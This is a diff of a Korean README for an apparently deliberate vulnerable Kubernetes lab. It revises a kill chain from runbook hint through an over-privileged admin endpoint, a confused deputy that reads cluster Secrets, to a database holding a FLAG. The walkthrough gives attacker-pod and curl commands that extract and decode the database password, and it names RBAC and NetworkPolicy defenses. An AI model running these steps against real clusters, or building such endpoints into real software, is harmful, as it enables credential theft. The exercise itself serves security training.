@@ -7,13 +7,18 @@
 
 | 단계 | 취약점 | 심은 위치 | MITRE |
 |------|--------|-----------|-------|
-| **① 초기침투** | DB 커넥션 스트링 평문 노출 | `internal-wiki` 런북 (`services/internal/42-internal-wiki.yaml`) | T1552.001 |
-| **② 권한상승** | `admin-dashboard` SA에 전 NS Secret 조회 + 정찰 권한 | `killchain/10-admin-overperm-rbac.yaml` + admin 파드 연결 | T1078 |
+| **① 초기침투** | 런북이 DB 비번 대신 "admin 콘솔 운영 엔드포인트로 조회" 안내 → 정찰 단서 | `internal-wiki` 런북 (`services/internal/42-internal-wiki.yaml`) | T1552.001 |
+| **② 권한상승** | `admin-dashboard` 과권한 SA + 내부 엔드포인트가 전 NS Secret 조회(DB 비번 획득) | `killchain/10-admin-overperm-rbac.yaml` + `42...`의 `/internal/secret` | T1078 |
 | **③ 측면이동** | NetworkPolicy 부재 → 어느 파드든 `database` 직접 도달 | (부재가 곧 취약점, k3s는 NP 강제 가능) | T1210 |
 | **④ 목표탈취** | 고객데이터 + FLAG | `postgres` `internal_secrets` 테이블 | T1213 |
 
-**사슬 구조**: ①(크레덴셜) + ③(네트워크)가 ④에서 합쳐진다. ②는 ①과 **독립적인 크레덴셜 획득
-경로**(Secret 직접 읽기) + 정찰 수단을 제공 → 다중 경로라 방어자가 한 곳만 막아선 못 끊는다.
+**사슬 구조(①→②→③→④)**: DB 비번이 더 이상 위키에 평문으로 없다 → ①(런북 단서)로 admin 콘솔을
+찾고 **②(과권한 SA)로 Secret 을 읽어야** 비번을 얻는다 → ③(NP 부재)로 database 도달 → ④ FLAG.
+②가 비번 획득의 **필수 관문**이라, 방어자는 **②(restrict_rbac) 또는 ③(add_networkpolicy)** 어느
+쪽을 막아도 공격을 끊을 수 있다(독립적으로 유효한 두 방어 선택지 = 공진화 전략성).
+> 설계 메모: 자동 공격자는 admin-dashboard 에 `exec` 할 수 없으므로, 수동 walkthrough 의 "파드 내부
+> 토큰 사용"을 **`/internal/secret/<ns>/<name>` 엔드포인트(confused deputy)**로 노출해 닿게 했다.
+> 엔드포인트는 마운트된 과권한 SA 로 조회 → `restrict_rbac` 로 바인딩 삭제되면 403.
 
 ## 구성
 ```
@@ -41,10 +46,14 @@ killchain/
 kubectl -n frontend run attacker --rm -it --image=nicolaka/netshoot --restart=Never -- bash
 ```
 
-**① 크레덴셜 유출 — 사내 위키 런북에서 DB 접속정보 획득:**
+**①→② 크레덴셜 획득 — 런북 단서 → admin 콘솔 과권한 엔드포인트로 DB Secret 조회:**
 ```bash
-curl -s http://internal-wiki.internal.svc.cluster.local/runbook.html | grep postgresql
-# → postgresql://appuser:devpassword123@postgres.database.svc.cluster.local:5432/customerdb
+# ① 런북엔 비번이 없고 admin 콘솔 엔드포인트 안내만:
+curl -s http://internal-wiki.internal.svc.cluster.local/runbook.html | grep -A1 internal/secret
+# ② 그 엔드포인트가 마운트된 과권한 SA 로 database Secret 을 읽어준다(confused deputy):
+curl -s http://admin-dashboard.internal.svc.cluster.local:8080/internal/secret/database/postgres-credentials \
+  | grep -o '"POSTGRES_PASSWORD":"[^"]*"'
+# → "POSTGRES_PASSWORD":"ZGV2cGFzc3dvcmQxMjM="   →  base64 -d  →  devpassword123
 ```
 
 **③ 측면이동 — NP 부재로 발판(frontend)에서 database 직접 도달 확인:**
